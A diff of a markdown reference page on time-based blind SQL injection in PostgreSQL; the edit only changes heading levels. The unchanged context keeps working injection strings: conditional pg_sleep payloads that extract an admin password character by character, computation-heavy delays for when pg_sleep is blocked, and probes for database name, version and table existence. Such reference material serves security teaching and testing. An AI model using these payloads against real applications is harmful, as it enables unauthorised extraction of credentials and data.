@@ -7,11 +7,9 @@ tags: ["time-based", "blind injection", "sleep"]
 lastUpdated: 2025-12-15
 ---
 
-## Timing
-
 Time-based SQL injection is particularly useful in blind scenarios where no visible output is returned from the database. By causing deliberate delays in the database response, an attacker can infer whether a condition is true or false based on the time it takes for the page to load.
 
-### PostgreSQL Sleep Function
+## PostgreSQL Sleep Function
 
 PostgreSQL provides the `pg_sleep()` function (available since version 8.2):
 
@@ -23,7 +21,7 @@ SELECT pg_sleep(5);
 SELECT pg_sleep(0.5);
 ```
 
-### Basic Sleep Injection
+## Basic Sleep Injection
 
 ```sql
 -- Direct sleep
@@ -36,7 +34,7 @@ SELECT pg_sleep(0.5);
 
 If the query takes an additional 5 seconds to return, the injection was successful.
 
-### Conditional Sleep
+## Conditional Sleep
 
 More useful for data extraction is conditional sleep, which only triggers the delay if a specific condition is true:
 
@@ -48,7 +46,7 @@ More useful for data extraction is conditional sleep, which only triggers the de
 ' AND CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN pg_sleep(5) ELSE pg_sleep(0) END--
 ```
 
-### Extracting Data Character by Character
+## Extracting Data Character by Character
 
 ```sql
 -- Extract first character of password
@@ -58,9 +56,9 @@ More useful for data extraction is conditional sleep, which only triggers the de
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END--
 ```
 
-### Alternative Timing Techniques
+## Alternative Timing Techniques
 
-#### Heavy Computation
+### Heavy Computation
 
 When `pg_sleep()` is blocked, use computation-heavy operations:
 
@@ -72,7 +70,7 @@ When `pg_sleep()` is blocked, use computation-heavy operations:
 ' AND (SELECT md5(md5(md5(repeat('a',10000000)))))::text IS NOT NULL--
 ```
 
-#### Using pg_sleep_for() and pg_sleep_until()
+### Using pg_sleep_for() and pg_sleep_until()
 
 Both functions are available since PostgreSQL 9.4:
 
@@ -84,9 +82,9 @@ SELECT pg_sleep_for('5 seconds');
 SELECT pg_sleep_until(now() + interval '5 seconds');
 ```
 
-### Practical Examples
+## Practical Examples
 
-#### Extracting Database Name
+### Extracting Database Name
 
 ```sql
 -- Check if database name starts with 'p'
@@ -96,28 +94,28 @@ SELECT pg_sleep_until(now() + interval '5 seconds');
 ' AND CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))>112) THEN pg_sleep(3) ELSE pg_sleep(0) END--
 ```
 
-#### Extracting PostgreSQL Version
+### Extracting PostgreSQL Version
 
 ```sql
 -- Check first character of version
 ' AND CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(3) ELSE pg_sleep(0) END--
 ```
 
-#### Enumerating Table Existence
+### Enumerating Table Existence
 
 ```sql
 -- Check if table exists
 ' AND CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0 THEN pg_sleep(3) ELSE pg_sleep(0) END--
 ```
 
-### Optimization Tips
+## Optimization Tips
 
 1. **Binary search**: Use ASCII value comparisons to reduce requests
 2. **Start with common characters**: Try 'a', 'e', 't', etc. first
 3. **Adjust timing**: Use shorter delays (2-3 seconds) for faster extraction
 4. **Account for network latency**: Run multiple tests to establish baseline
 
-### Notes
+## Notes
 
 - `pg_sleep()` requires PostgreSQL 8.2 or higher
 - Time-based injection is slower than other methods
